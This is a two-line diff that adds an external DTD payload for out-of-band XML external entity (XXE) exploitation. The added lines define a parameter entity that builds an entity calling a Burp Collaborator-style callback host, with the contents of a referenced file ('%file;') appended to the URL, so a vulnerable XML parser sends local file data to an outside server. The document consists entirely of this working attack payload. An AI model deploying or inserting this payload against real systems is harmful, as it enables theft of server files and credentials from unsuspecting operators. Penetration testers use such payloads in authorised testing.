@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://8hqiha0damjvc5uw2iofobo5mwsngea2z.burp.17.rs/xxe-callback?data=%file;'>">
+%all;
